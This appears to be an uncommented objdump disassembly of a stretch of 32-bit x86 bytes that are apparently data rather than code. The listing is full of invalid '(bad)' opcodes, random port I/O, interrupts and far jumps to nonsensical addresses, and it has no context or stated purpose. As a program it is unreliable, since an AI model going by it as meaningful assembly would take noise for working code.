  4150d2:	lods   al,BYTE PTR ds:[esi]
  4150d3:	adc    DWORD PTR [ebx],0xee2e6c66
  4150d9:	lods   eax,DWORD PTR ds:[esi]
  4150da:	aad    0x63
  4150dc:	sub    ch,BYTE PTR [ecx]
  4150de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150df:	loop   0x41513b
  4150e1:	inc    edx
  4150e2:	loopne 0x415078
  4150e4:	mov    edi,0xccc67fd
  4150e9:	inc    eax
  4150ea:	imul   edx,DWORD PTR [esi-0x6e],0xffffffe6
  4150ee:	fstp   QWORD PTR [ebx]
  4150f0:	or     al,0xe4
  4150f2:	cmp    DWORD PTR [esi],ebp
  4150f4:	dec    ecx
  4150f5:	in     eax,0x95
  4150f7:	push   cs
  4150f8:	dec    esp
  4150f9:	sbb    DWORD PTR [ecx-0x7ec269fc],0x11
  415100:	lock and eax,0xbf456946
  415106:	lahf   
  415107:	sbb    edx,eax
  415109:	xchg   ebp,eax
  41510a:	or     al,0x7
  41510c:	int    0x4d
  41510e:	jmp    0x61bcde1e
  415113:	xor    edx,ebp
  415115:	scas   eax,DWORD PTR es:[edi]
  415116:	inc    ebp
  415117:	push   0xffffffdc
  415119:	jae    0x41509e
  41511b:	iret   
  41511c:	mov    ds:0xe0a9e99,eax
  415121:	and    al,0x2b
  415123:	jns    0x41510b
  415125:	int    0xa
  415127:	adc    esp,0xffffffb6
  41512a:	push   ss
  41512b:	mov    dl,0xd
  41512d:	stc    
  41512e:	inc    eax
  41512f:	clc    
  415130:	jg     0x4150f2
  415132:	xchg   esi,eax
  415133:	cmc    
  415134:	jle    0x415196
  415136:	and    esp,DWORD PTR [edi-0x2de9bf36]
  41513c:	call   0x4ba1:0xb6eef77c
  415143:	pusha  
  415144:	xchg   edi,eax
  415145:	retf   0x460
  415148:	adc    DWORD PTR [esi],0xbda37bd3
  41514e:	rol    bh,cl
  415150:	scas   eax,DWORD PTR es:[edi]
  415151:	mov    dh,0xb
  415153:	jbe    0x415199
  415155:	ja     0x4151cc
  415157:	fidiv  WORD PTR [ebx+0x459b13a3]
  41515d:	mov    cl,0x2
  41515f:	mov    bh,0xec
  415161:	pop    eax
  415162:	push   ss
  415163:	pop    ebx
  415164:	stos   DWORD PTR es:[edi],eax
  415165:	dec    edx
  415166:	jle    0x41514c
  415168:	jge    0x415161
  41516a:	and    DWORD PTR [ebx+eiz*2-0x42],edi
  41516e:	leave  
  41516f:	rcr    DWORD PTR [esi+0x182d9e92],1
  415175:	mov    ebp,esi
  415177:	dec    ecx
  415178:	mov    edx,0x551ddbce
  41517d:	dec    eax
  41517e:	stc    
  41517f:	imul   eax,DWORD PTR [edx+0x10],0xffffffd1
  415183:	push   eax
  415184:	jo     0x41513c
  415186:	inc    edx
  415187:	mov    eax,0xa37b1bcd
  41518c:	fdiv   st,st(3)
  41518e:	or     DWORD PTR [esi-0x1b],edx
  415191:	sub    dl,BYTE PTR [ebp+0x6e]
  415194:	dec    ebx
  415195:	iret   
  415196:	mov    cl,0xd7
  415198:	cmc    
  415199:	loopne 0x415202
  41519b:	xchg   ecx,eax
  41519c:	inc    ecx
  41519d:	mov    ecx,0x9734c10b
  4151a2:	mov    esi,0xc96e83f7
  4151a7:	or     DWORD PTR [edi+0x3abfaf2c],0xb978fdcd
  4151b1:	xchg   edi,eax
  4151b2:	add    al,0x0
  4151b4:	std    
  4151b5:	adc    al,0x4e
  4151b7:	imul   DWORD PTR [ebp-0x7a0dbe91]
  4151bd:	aas    
  4151be:	push   esp
  4151bf:	mov    edx,0x14e5d12a
  4151c4:	lods   al,BYTE PTR ds:[esi]
  4151c5:	das    
  4151c6:	add    DWORD PTR [esp+eax*4-0x4b],ebp
  4151ca:	and    esi,DWORD PTR [ecx]
  4151cc:	push   0x1b
  4151ce:	int    0x1f
  4151d0:	sub    eax,0xf7cbae53
  4151d5:	fidivr DWORD PTR [ecx+0x5ddef214]
  4151db:	xor    BYTE PTR [ebx],0x66
  4151de:	mov    edi,0x4ce98b49
  4151e3:	fsubr  QWORD PTR [ebx]
  4151e5:	and    DWORD PTR [edi-0x46],eax
  4151e8:	lds    ebp,FWORD PTR [edi-0x5f]
  4151eb:	inc    ebp
  4151ec:	pop    es
  4151ed:	sbb    bh,BYTE PTR [eax+ebp*1+0xfdb8b09]
  4151f4:	mov    bl,ch
  4151f6:	inc    ecx
  4151f7:	sbb    eax,0xa86f12b9
  4151fc:	scas   al,BYTE PTR es:[edi]
  4151fd:	std    
  4151fe:	push   esp
  4151ff:	and    dl,dl
  415201:	cli    
  415202:	out    0xfa,eax
  415204:	cmp    eax,0xad5733ed
  415209:	inc    ecx
  41520a:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41520c:	dec    esi
  41520d:	stc    
  41520e:	xchg   esp,eax
  41520f:	mov    esi,ebp
  415211:	iret   
  415212:	jle    0x415257
  415214:	enter  0xea04,0xfe
  415218:	xchg   esi,eax
  415219:	pop    eax
  41521a:	ins    DWORD PTR es:[edi],dx
  41521b:	sub    al,0x88
  41521d:	jmp    0x415241
  41521f:	mov    DWORD PTR [edx-0x75],ebx
  415222:	pop    ecx
  415223:	and    DWORD PTR [edi],0xffffffe6
  415226:	and    eax,0x606435a9
  41522b:	fldcw  WORD PTR [eax+0x43]
  41522e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41522f:	xor    esi,DWORD PTR [eax]
  415231:	push   ecx
  415232:	or     edx,DWORD PTR [esi+edx*4-0x56]
  415236:	aad    0xee
  415238:	xor    BYTE PTR [ecx-0x49],bh
  41523b:	neg    DWORD PTR [ebx+0x29519d0b]
  415241:	push   esp
  415242:	jb     0x4152c2
  415244:	sub    DWORD PTR [ebx+0x43],edx
  415247:	aaa    
  415248:	dec    edi
  415249:	sub    al,BYTE PTR [esi+0x11afd539]
  41524f:	(bad)  [ebx-0x7]
  415252:	movsx  ecx,ah
  415255:	add    eax,0x4b67de84
  41525a:	fcom   DWORD PTR [ecx-0x24]
  41525d:	dec    edi
  41525e:	into   
  41525f:	cmp    al,0xb9
  415261:	stc    
  415262:	mov    DWORD PTR [eax-0x53],edx
  415265:	lea    ebp,[edi+ebx*2-0x5c]
  415269:	out    0xc,eax
  41526b:	int3   
  41526c:	data16 and al,0xd4
  41526f:	cmp    dl,ch
  415271:	mov    eax,ds:0x24f591b6
  415276:	cmp    BYTE PTR [ebx-0x62],bh
  415279:	test   BYTE PTR [edx+edx*8+0x58],ch
  41527d:	add    bl,BYTE PTR [edi+0x5060b1aa]
  415283:	outs   dx,BYTE PTR ds:[esi]
  415284:	xchg   ebp,eax
  415285:	xchg   esp,eax
  415286:	arpl   bp,cx
  415288:	jbe    0x4152de
  41528a:	pop    edi
  41528b:	fs jg  0x41522b
  41528e:	es push ecx
  415290:	pop    edx
  415291:	pushf  
  415292:	add    ah,bh
  415294:	or     ch,bl
  415296:	rcr    BYTE PTR [edx-0x80],cl
  415299:	adc    ch,BYTE PTR [ebx-0x27]
  41529c:	data16 ror BYTE PTR [edx-0x42274564],0xb6
  4152a4:	dec    ecx
  4152a5:	sub    ebx,DWORD PTR [edx]
  4152a7:	(bad)  
  4152a8:	and    DWORD PTR [edi-0x77],ebx
  4152ab:	xchg   esi,eax
  4152ac:	shl    dl,0x23
  4152af:	and    esi,DWORD PTR [esi]
  4152b1:	mov    ebx,0xe3aad4
  4152b6:	mov    eax,ds:0x458fb1d6
  4152bb:	adc    BYTE PTR [edi],0x76
  4152be:	xchg   ebp,eax
  4152bf:	nop
  4152c0:	adc    DWORD PTR [ebp-0x7f],esp
  4152c3:	jmp    0xbae0:0xf3db3597
  4152ca:	ins    DWORD PTR es:[edi],dx
  4152cb:	mov    ebp,DWORD PTR [ecx+esi*8]
  4152ce:	out    0x7d,eax
  4152d0:	pop    ss
  4152d1:	arpl   WORD PTR [ebx+0x4965868a],ax
  4152d7:	xchg   esp,eax
  4152d8:	mov    ebp,0xbf8674d5
  4152dd:	ja     0x4152d4
  4152df:	in     eax,dx
  4152e0:	sbb    DWORD PTR [ebp-0x21],esi
  4152e3:	fbld   TBYTE PTR ds:0xa69d8dc4
  4152e9:	xlat   BYTE PTR ds:[ebx]
  4152ea:	fwait
  4152eb:	je     0x415300
  4152ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152ee:	inc    esi
  4152ef:	xor    DWORD PTR [ebx-0x54],edx
  4152f2:	aad    0x61
  4152f4:	xchg   ebp,eax
  4152f5:	or     edx,esi
  4152f7:	pop    esp
  4152f8:	pop    ecx
  4152f9:	push   esi
  4152fa:	sbb    ah,dl
  4152fc:	loop   0x415342
  4152fe:	lock xor BYTE PTR [esi],ch
  415301:	and    BYTE PTR [esi+0x78c4ac44],0xfd
  415308:	and    dh,ch
  41530a:	xchg   ecx,eax
  41530b:	icebp  
  41530c:	mov    esi,0xaf4dff0b
  415311:	in     eax,0x92
  415313:	cmp    BYTE PTR [eax-0x33eb146e],ah
  415319:	add    al,0xcb
  41531b:	and    DWORD PTR [ebx+0x2d2b770e],0x60
  415322:	pop    es
  415323:	sub    ch,ch
  415325:	imul   edx,DWORD PTR [ecx],0xa14da745
  41532b:	repz or esp,eax
  41532e:	frstpm(287 only) 
  415330:	push   eax
  415331:	xchg   edx,eax
  415332:	xchg   ebx,eax
  415333:	xor    eax,0x36bdb0e2
  415338:	or     edi,ebp
  41533a:	add    DWORD PTR [ebx],edx
  41533c:	dec    edx
  41533d:	mov    ds:0x2bf2bf2e,al
  415342:	test   eax,0xd7a1a74a
  415347:	pop    ds
  415348:	in     eax,0x14
  41534a:	sbb    edx,edi
  41534c:	mov    BYTE PTR [ebx],dl
  41534e:	in     al,0xd8
  415350:	je     0x4152f5
  415352:	int    0xde
  415354:	repnz adc al,0x6e
  415357:	xor    eax,0x41748bdb
  41535c:	mov    cl,0xd6
  41535e:	out    dx,eax
  41535f:	enter  0xa6a5,0xc1
  415363:	ins    BYTE PTR es:[edi],dx
  415364:	push   ecx
  415365:	sti    
  415366:	jbe    0x415362
  415368:	icebp  
  415369:	aas    
  41536a:	push   ss
  41536b:	ds js  0x41533e
  41536e:	xchg   esp,eax
  41536f:	fldcw  WORD PTR [ebx+0x5b1f0e60]
  415375:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415376:	in     eax,0xb4
  415378:	and    al,0xf4
  41537a:	push   esi
  41537b:	inc    edi
  41537c:	outs   dx,BYTE PTR ds:[esi]
  41537d:	test   al,0xc8
  41537f:	es xchg ecx,eax
  415381:	or     ah,BYTE PTR [edx]
  415383:	push   ebp
  415384:	mov    ds:0xd3cbc09e,eax
  415389:	mov    dh,0x57
  41538b:	mov    ecx,fs
  41538d:	add    edx,0x41df0d9
  415393:	call   0x824829af
  415398:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415399:	xchg   esi,eax
  41539a:	fnstenv [esi-0x2e]
  41539d:	jo     0x4153cb
  41539f:	and    eax,0x54a7f35b
  4153a4:	sub    al,0xfa
  4153a6:	dec    esp
  4153a7:	and    al,0x2e
  4153a9:	inc    eax
  4153aa:	jmp    0x415361
  4153ac:	lods   eax,DWORD PTR ds:[esi]
  4153ad:	mov    edx,0xb7583688
  4153b2:	inc    esp
  4153b3:	jnp    0x415386
  4153b5:	cli    
  4153b6:	jp     0x4153d2
  4153b8:	repz cmc 
  4153ba:	adc    ebp,DWORD PTR [esi]
  4153bc:	leave  
  4153bd:	xor    esp,ebx
  4153bf:	mov    bh,0x79
  4153c1:	outs   dx,DWORD PTR ds:[esi]
  4153c2:	push   esp
  4153c3:	jo     0x415418
  4153c5:	push   ebp
  4153c6:	push   edi
  4153c7:	jle    0x4153ee
  4153c9:	ja     0x4153a9
  4153cb:	sbb    al,0xea
  4153cd:	pop    eax
  4153ce:	sub    DWORD PTR [eax],ebp
  4153d0:	or     esi,DWORD PTR [edx-0x31]
  4153d3:	cli    
  4153d4:	dec    ecx
  4153d5:	push   edi
  4153d6:	add    eax,0x79056276
  4153db:	(bad)  
  4153dc:	or     eax,0x3021b148
  4153e1:	mov    al,ah
  4153e3:	and    al,0xa3
  4153e5:	(bad)  
  4153e6:	loopne 0x415441
  4153e8:	xchg   ecx,eax
  4153e9:	fwait
  4153ea:	aas    
  4153eb:	xlat   BYTE PTR ds:[ebx]
  4153ec:	cmc    
  4153ed:	cmp    DWORD PTR [edx-0x1e8821d],edi
  4153f3:	shl    BYTE PTR [edx],0x7
  4153f6:	ds inc ecx
  4153f8:	arpl   WORD PTR [esi],cx
  4153fa:	inc    ebp
  4153fb:	(bad)  
  4153fc:	xchg   edi,eax
  4153fd:	sbb    al,BYTE PTR [ecx]
  4153ff:	add    DWORD PTR [esi-0x63],ebp
  415402:	and    BYTE PTR [ecx+0x11],bh
  415405:	mov    ebp,0x20c5205
  41540a:	and    eax,DWORD PTR [edx+0x2d]
  41540d:	mov    bl,0x72
  41540f:	mov    cs,WORD PTR [esi]
  415411:	jmp    0x3dba:0x8df0a63c
  415418:	in     eax,0xeb
  41541a:	or     BYTE PTR [ebp+eax*1-0xa],bh
  41541e:	mov    esi,0x650568eb
  415423:	call   0x37d6:0x568e0797
  41542a:	imul   edi,DWORD PTR [esi],0x90290689
  415430:	inc    esi
  415431:	xchg   edx,eax
  415432:	sub    DWORD PTR [ecx-0x4bbfe186],0x165b735e
  41543c:	icebp  
  41543d:	out    dx,eax
  41543e:	dec    edi
  41543f:	xchg   edx,eax
  415440:	sbb    ebp,DWORD PTR [edi-0x3283c543]
  415446:	mov    al,ds:0x20e65f60
  41544b:	stc    
  41544c:	and    BYTE PTR [edx+0x4c],bh
  41544f:	lock sub DWORD PTR [edi+0x66],0x169867bb
  415457:	dec    edi
  415458:	(bad)  ds:0xf0c5ebf
  41545e:	cmp    al,0xc8
  415460:	scas   eax,DWORD PTR es:[edi]
  415461:	mov    ch,0x4
  415463:	add    eax,0xdece0cb9
  415468:	push   ecx
  415469:	(bad)  
  41546a:	dec    edi
  41546b:	jmp    0xda96:0x2ead2e53
  415472:	int    0xc6
  415474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415475:	jno    0x4154d7
  415477:	sub    al,0x3e
  415479:	adc    ebp,DWORD PTR ds:0xf771f732
  41547f:	cmp    eax,0x6d31b664
  415484:	sub    eax,0x33278152
  415489:	cmp    DWORD PTR [edx-0x52],ebx
  41548c:	aad    0x89
  41548e:	xor    eax,0xa1eb9f47
  415493:	out    dx,al
  415494:	push   es
  415495:	dec    BYTE PTR [edi+0x5a]
  415498:	add    BYTE PTR ds:0x673579f0,ch
  41549e:	mov    edi,0xcfccec81
  4154a3:	mov    WORD PTR [ebx+0x35],gs
  4154a6:	mov    dh,BYTE PTR [eax]
  4154a8:	dec    edx
  4154a9:	aad    0x73
  4154ab:	stos   DWORD PTR es:[edi],eax
  4154ac:	addr16 jmp 0x41552d
  4154af:	stos   DWORD PTR es:[edi],eax
  4154b0:	in     eax,dx
  4154b1:	scas   eax,DWORD PTR es:[edi]
  4154b2:	shl    DWORD PTR [ebx-0x517103ee],1
  4154b8:	test   esp,ebx
  4154ba:	sbb    cl,BYTE PTR [ecx+0x41]
  4154bd:	jno    0x41544d
  4154bf:	repz push ds
  4154c1:	aas    
  4154c2:	and    ebx,ecx
  4154c4:	clc    
  4154c5:	dec    esi
  4154c6:	pop    esp
  4154c7:	in     al,0x54
  4154c9:	fist   DWORD PTR [esi]
  4154cb:	xlat   BYTE PTR ds:[ebx]
  4154cc:	ficomp DWORD PTR [ebx+0x4e]
  4154cf:	fisubr WORD PTR [edi+edi*8]
  4154d2:	sub    eax,0xb51b60c4
  4154d7:	cli    
  4154d8:	push   0x64
  4154da:	dec    eax
  4154db:	add    DWORD PTR [edi-0x1],esi
  4154de:	(bad)  
  4154e0:	pop    ds
  4154e1:	mov    dl,0x26
  4154e3:	and    BYTE PTR [edx],al
  4154e5:	jmp    0xf887:0x2d2d5f58
  4154ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154ed:	xlat   BYTE PTR ds:[ebx]
  4154ee:	dec    esp
  4154ef:	pop    ds
  4154f0:	add    esp,DWORD PTR [ecx]
  4154f2:	xor    DWORD PTR [eax+0x2a],ebp
  4154f5:	sahf   
  4154f6:	and    DWORD PTR [ebx+0x16],esp
  4154f9:	mov    esp,0x4667e2da
  4154fe:	push   ebp
  4154ff:	sbb    BYTE PTR [edx+0x63],ah
  415502:	(bad)  
  415503:	fdivr  st(1),st
  415505:	sub    al,0x9e
  415507:	out    0x8a,eax
  415509:	push   cs
  41550a:	lods   al,BYTE PTR ds:[esi]
  41550b:	(bad)  
  41550c:	sub    DWORD PTR fs:[ebx+0x20],ebp
  415510:	cli    
  415511:	mov    DWORD PTR [ebx-0x3b],0x8bd5e8ee
  415518:	lock lahf 
  41551a:	mov    ds:0x8d6591d9,eax
  41551f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415520:	mov    eax,0xd1b1aa9b
  415525:	inc    edi
  415526:	or     eax,0x5f3ef087
  41552b:	mov    bl,0xc6
  41552d:	or     eax,0x3589316d
  415532:	cli    
  415533:	sub    dl,cl
  415535:	mov    al,0x2
  415537:	jge    0x415553
  415539:	mov    bh,ch
  41553b:	call   0xd3d1de2b
  415540:	in     eax,0x5b
  415542:	mov    ecx,0xb2956689
  415547:	in     eax,dx
  415548:	sbb    eax,0xabf2623f
  41554d:	add    al,0x31
  41554f:	pop    esp
  415550:	xchg   esp,eax
  415551:	cmp    al,0x82
  415553:	jns    0x4154d9
  415555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415556:	loop   0x41550e
  415558:	push   esp
  415559:	mul    DWORD PTR [edx+0x3314d771]
  41555f:	lahf   
  415560:	ja     0x41550e
  415562:	adc    eax,0xe6867432
  415567:	cs pop ebx
  415569:	popa   
  41556a:	add    DWORD PTR [ebp-0x5439845b],esi
  415570:	lea    ecx,[esp+eiz*2]
  415573:	mov    ch,0x83
  415575:	loop   0x41554b
  415577:	scas   al,BYTE PTR es:[edi]
  415578:	scas   eax,DWORD PTR es:[edi]
  415579:	adc    dl,BYTE PTR [ebx-0x269d56f]
  41557f:	stos   DWORD PTR es:[edi],eax
  415580:	push   ss
  415581:	mov    al,ds:0xa0db79f3
  415586:	retf   
  415587:	mov    ecx,DWORD PTR [edx+edx*2-0x5c7ac5ac]
  41558e:	icebp  
  41558f:	das    
  415590:	lahf   
  415591:	mov    eax,0xe8f91521
  415596:	add    eax,0xa4c47cfe
  41559b:	dec    esi
  41559c:	stc    
  41559d:	cwde   
  41559e:	aas    
  41559f:	dec    ebx
  4155a0:	mov    bh,0xa3
  4155a2:	jns    0x41554e
  4155a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155a5:	xchg   ebp,esi
  4155a7:	adc    BYTE PTR [ebx+eax*8-0x59],bh
  4155ab:	xchg   esp,eax
  4155ac:	pop    ss
  4155ad:	call   0x62f9f354
  4155b2:	retf   
  4155b3:	mov    ch,0x8b
  4155b5:	mov    al,ds:0xad98b741
  4155ba:	xchg   esi,eax
  4155bb:	jge    0x41557a
  4155bd:	jo     0x41556a
  4155bf:	mov    BYTE PTR [ebx+0xa6b10a],bh
  4155c5:	in     al,dx
  4155c6:	(bad)  
  4155c7:	out    0x1f,eax
  4155c9:	cld    
  4155ca:	sahf   
  4155cb:	pop    ebx
  4155cc:	test   eax,0xb6872c66
  4155d1:	inc    eax
  4155d2:	fild   WORD PTR [edi+0x75335ea6]
  4155d8:	sbb    ebp,ebx
  4155da:	(bad)  
  4155db:	cmp    esp,DWORD PTR [edi]
  4155dd:	sub    DWORD PTR [ebp-0x60620320],edi
  4155e3:	add    al,0x5b
  4155e5:	lds    esi,FWORD PTR [ebp-0x3c]
  4155e8:	jo     0x415660
  4155ea:	lea    ebp,[eax-0x1d0a348c]
  4155f0:	dec    ebx
  4155f1:	xchg   esp,eax
  4155f2:	mov    esi,DWORD PTR [edi-0x441737be]
  4155f8:	dec    esp
  4155f9:	fimul  WORD PTR [ebx+eiz*2+0x35de544e]
  415600:	ret    0xd7be
  415603:	jae    0x4155df
  415605:	push   0x59c879c0
  41560a:	ret    0xe197
  41560d:	sub    BYTE PTR [eax],dl
  41560f:	retf   0x5f15
  415612:	fwait
  415613:	popa   
  415614:	fcmovnbe st,st(1)
  415616:	mov    edx,0x836cc8f
  41561b:	pop    ecx
  41561c:	cmc    
  41561d:	xor    BYTE PTR [ebx+0x59],0x68
  415621:	sti    
  415622:	loope  0x415607
  415624:	and    ebx,DWORD PTR [ebx-0x8f358a5]
  41562a:	movzx  edx,WORD PTR [ebp+0x5646ca5f]
  415631:	lds    edi,FWORD PTR [esi-0x4e]
  415634:	cmp    DWORD PTR [ebx],edx
  415636:	iret   
  415637:	pop    ebp
  415638:	enter  0xfa46,0x27
  41563c:	test   BYTE PTR [ecx],ch
  41563e:	or     eax,0x5519aab6
  415643:	mov    dl,0xe7
  415645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415646:	lods   al,BYTE PTR ds:[esi]
  415647:	pop    esp
  415648:	hlt    
  415649:	inc    esp
  41564a:	in     al,0x47
  41564c:	jle    0x415688
  41564e:	mov    ch,0xbc
  415650:	jae    0x415656
  415652:	fs loopne 0x4156b7
  415655:	imul   ebp,DWORD PTR [ebp+0x54],0xffffffe0
  415659:	ja     0x4155e7
  41565b:	das    
  41565c:	inc    esp
  41565d:	(bad)  
  41565e:	cdq    
  41565f:	cwde   
  415660:	inc    eax
  415661:	enter  0xec0f,0x46
  415665:	dec    ecx
  415666:	add    DWORD PTR [ebx+0x2874124b],0x499849d5
  415670:	test   eax,0x75bb164a
  415675:	in     al,0xe0
  415677:	enter  0x3377,0x30
  41567b:	mov    ds:0x11f8e08,al
  415680:	(bad)  
  415681:	cdq    
  415682:	cli    
  415683:	pop    esp
  415684:	sbb    edi,DWORD PTR gs:[ebx+eax*8+0x4821f147]
  41568c:	push   es
  41568d:	push   esp
  41568e:	fsubr  QWORD PTR [ebp-0x4a]
  415691:	fisub  WORD PTR [esi+0x4d]
  415694:	shl    DWORD PTR [esi-0x17c21260],cl
  41569a:	outs   dx,BYTE PTR ds:[esi]
  41569b:	mov    dh,BYTE PTR [edi-0x2e]
  41569e:	push   ecx
  41569f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156a0:	mov    ah,BYTE PTR [edx+0x71]
  4156a3:	retf   0x1e0d
  4156a6:	out    0x34,al
  4156a8:	fistp  WORD PTR [eax-0x523bdfca]
  4156ae:	xor    eax,0xf2eaca71
  4156b3:	and    eax,0xeb4aaa00
  4156b8:	mov    ebx,ebp
  4156ba:	pusha  
  4156bb:	fldenv [ecx-0x55]
  4156be:	jmp    0xed86c07e
  4156c3:	iret   
  4156c4:	and    BYTE PTR [eax-0x759a0381],ah
  4156ca:	ds ds pop esp
  4156cd:	call   0x3882fd21
  4156d2:	and    ecx,DWORD PTR ds:0x3d67faf8
  4156d8:	adc    BYTE PTR [ecx+0x41],bl
  4156db:	mov    gs,WORD PTR [ebp+0x58f64a49]
  4156e1:	lahf   
  4156e2:	dec    eax
  4156e3:	mov    esp,DWORD PTR [ecx-0x16de692e]
  4156e9:	sti    
  4156ea:	jp     0x41568d
  4156ec:	push   ebp
  4156ed:	ss pop esp
  4156ef:	sahf   
  4156f0:	test   ah,0x95
  4156f3:	or     al,0x54
  4156f5:	aaa    
  4156f6:	bound  ecx,QWORD PTR [ebx+0x1d0e14b7]
  4156fc:	inc    edi
  4156fd:	cli    
  4156fe:	jbe    0x415767
  415700:	xchg   ebp,eax
  415701:	jne    0x415715
  415703:	jmp    0xef13:0x1e6c4de8
  41570a:	sbb    BYTE PTR [ebp+0x6ef48a85],0xd1
  415711:	inc    edx
  415712:	add    al,0xd2
  415714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415715:	push   ebx
  415716:	sub    BYTE PTR [ebp-0x1def4593],dh
  41571c:	repnz in eax,dx
  41571e:	out    dx,al
  41571f:	retf   
  415720:	fucomp st(7)
  415722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415723:	inc    edx
  415724:	jno    0x415726
  415726:	leave  
  415727:	mov    edx,0x8b2f4850
  41572c:	xchg   edi,eax
  41572d:	imul   ebp,edx,0x2c
  415730:	icebp  
  415731:	data16 mov cs:0xa5f5f6fe,al
  415738:	imul   ebx,DWORD PTR [edx+0x5f71d8dc],0x94e0359a
  415742:	je     0x41572d
  415744:	xor    eax,DWORD PTR [edx]
  415746:	sub    ebp,DWORD PTR [eax+0x15]
  415749:	fist   DWORD PTR [ecx+edx*2-0x65b8e1b1]
  415750:	mov    ecx,0x97f1e447
  415755:	push   0xe24f1dd1
  41575a:	repnz aaa 
  41575c:	dec    ebp
  41575d:	out    dx,al
  41575e:	in     al,0x52
  415760:	shl    BYTE PTR [ebx-0x3a],cl
  415763:	jecxz  0x41578b
  415765:	jns    0x415751
  415767:	test   al,0x20
  415769:	push   eax
  41576a:	fsub   DWORD PTR [ebp-0x34]
  41576d:	lock xchg ebp,ecx
  415770:	daa    
  415771:	xchg   ecx,eax
  415772:	ins    BYTE PTR es:[edi],dx
  415773:	int3   
  415774:	stos   BYTE PTR es:[edi],al
  415775:	push   0x8e00a4df
  41577a:	sbb    dh,dl
  41577c:	push   edi
  41577d:	adc    al,0x72
  41577f:	(bad)  
  415780:	std    
  415781:	dec    edx
  415782:	or     dl,BYTE PTR ds:[edx-0x6c]
  415786:	sahf   
  415787:	cmp    al,0xd4
  415789:	loopne 0x4157c2
  41578b:	sbb    ch,al
  41578d:	js     0x4157ef
  41578f:	leave  
  415790:	data16 rcl BYTE PTR [ebx],0xe9
  415794:	jbe    0x4157a5
  415796:	xor    al,0x91
  415798:	cwde   
  415799:	hlt    
  41579a:	xchg   ecx,eax
  41579b:	mov    dh,0x23
  41579d:	add    al,0x3d
  41579f:	aas    
  4157a0:	pusha  
  4157a1:	div    dh
  4157a3:	sbb    di,bp
  4157a6:	push   cs
  4157a7:	mov    ch,0xed
  4157a9:	loop   0x41576f
  4157ab:	and    eax,0x34f2769
  4157b0:	jl     0x4157f7
  4157b2:	dec    edi
  4157b3:	imul   ecx,DWORD PTR [ebp-0xe1a1be8],0x65a4408d
  4157bd:	lds    eax,FWORD PTR [esi]
  4157bf:	jae    0x415835
  4157c1:	inc    esi
  4157c2:	adc    DWORD PTR [ecx+0x5fd3f909],0x2e
  4157c9:	std    
  4157ca:	int3   
  4157cb:	and    ch,BYTE PTR [eax]
  4157cd:	mov    eax,ds:0xa08ababc
  4157d2:	push   ss
  4157d3:	mov    eax,0x5f913152
  4157d8:	stos   DWORD PTR es:[edi],eax
  4157d9:	daa    
  4157da:	neg    BYTE PTR [esi]
  4157dc:	mov    cl,ch
  4157de:	inc    ebp
  4157df:	int3   
  4157e0:	cs (bad) 
  4157e2:	pop    ebx
  4157e3:	cmp    al,BYTE PTR [ebp+0x4f46ad]
  4157e9:	sbb    ebp,DWORD PTR [ebx+0x50]
  4157ec:	xchg   esp,eax
  4157ed:	xchg   DWORD PTR [edx+0x552a5386],esp
  4157f3:	out    dx,al
  4157f4:	mov    ch,0x78
  4157f6:	loope  0x415821
  4157f8:	and    eax,0x27482ab4
  4157fd:	fcomp  DWORD PTR [ebx]
  4157ff:	shl    eax,1
  415801:	or     DWORD PTR [eax-0xa10985],ebx
  415807:	cld    
  415808:	pop    esp
  415809:	push   esi
  41580a:	sbb    edx,DWORD PTR [ecx-0xf554124]
  415810:	adc    dh,bh
  415812:	cdq    
  415813:	cdq    
  415814:	ret    0x3df6
  415817:	stos   DWORD PTR es:[edi],eax
  415818:	xchg   ebp,eax
  415819:	xchg   ebp,eax
  41581a:	in     eax,0x8f
  41581c:	xchg   edx,eax
  41581d:	push   esp
  41581e:	pop    edi
  41581f:	popa   
  415820:	mov    esi,DWORD PTR [eax+ecx*2+0x1c5a0b47]
  415827:	xor    edx,DWORD PTR ds:0x8333e0ed
  41582d:	ss fwait
  41582f:	dec    eax
  415830:	push   esi
  415831:	pop    ebx
  415832:	adc    al,0x5a
  415834:	dec    esi
  415835:	jae    0x41589c
  415837:	sbb    al,dl
  415839:	test   BYTE PTR [esi+0x1baa394],0x78
  415840:	and    BYTE PTR [ecx+0x36],ah
  415843:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415844:	fisub  DWORD PTR [eax+0x6f]
  415847:	sub    al,0x28
  415849:	ds push edx
  41584b:	shl    DWORD PTR [ebx+0x45c660da],1
  415851:	popf   
  415852:	jmp    0xeffc1d3
  415857:	fmul   QWORD PTR [edi+0x62a5f2d2]
  41585d:	test   DWORD PTR [ebp+0x12cd1b92],ebp
  415863:	repnz into 
  415865:	xchg   esi,eax
  415866:	mov    ebx,0x2dc8a87b
  41586b:	jecxz  0x415806
  41586d:	jne    0x41587f
  41586f:	push   ebp
  415870:	loop   0x4158d5
  415872:	sbb    BYTE PTR [esi],ah
  415874:	jecxz  0x4158e8
  415876:	ja     0x415886
  415878:	dec    eax
  415879:	push   esp
  41587a:	sahf   
  41587b:	and    eax,0x9dba8b2f
  415880:	adc    eax,0x3de5d488
  415885:	cmp    BYTE PTR [ebp-0x71],dh
  415888:	fnsave [edi]
  41588a:	pop    edi
  41588b:	sbb    dh,ch
  41588d:	lds    ebx,FWORD PTR [eax+0x61]
  415890:	(bad)  
  415891:	inc    ebx
  415892:	retf   
  415893:	lock repnz das 
  415896:	call   FWORD PTR [ebx-0x18e62fbb]
  41589c:	fst    st(4)
  41589e:	xor    eax,0xca051c46
  4158a3:	ins    BYTE PTR es:[edi],dx
  4158a4:	jo     0x4158ec
  4158a6:	call   0x6752f44e
  4158ab:	nop
  4158ac:	out    dx,eax
